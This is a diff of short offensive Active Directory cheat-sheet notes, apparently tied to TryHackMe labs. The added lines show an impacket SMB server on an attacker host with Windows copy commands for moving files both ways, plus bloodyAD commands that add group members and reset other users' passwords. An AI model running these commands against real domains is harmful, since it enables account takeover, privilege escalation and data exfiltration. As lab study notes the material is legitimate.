@@ -1,12 +1,35 @@
+[ACL abuse - Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html)
 
-Change the password of another user you have the permissions of changing the password :
-```powershell
-Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+## SMB file transfer
+
+On Linux machine :
+```
+mkdir share
+impacket-smbserver share -smb2support share -user guest -password guest
 ```
 
-Configuring DNS to see Domain Controller :
-```bash
-systemd-resolve --interface breachad --set-dns $THMDCIP --set-domain za.tryhackme.com
-# THMDCIP contains ip of the domain controller (10.10.200.22)
-# za.tryhackme.com is the domain that will be resolved as dns
+On Windows :
 ```
+net use n: \\IP\share /user:fred fred
+copy n:\filename .
+copy filename n:\
+```
+
+Using URL : `smb://IP/share`  
+Using UNC path : `//IP/share`
+
+
+## Add user to group 
+
+```
+bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
+```
+
+## Change password of user
+
+```
+bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
+```
+
+## Configuring DNS to see Domain Controller :  
+edit /etc/resolv.conf and set `nameserver` to the DC's IP or another IP with 53 port open
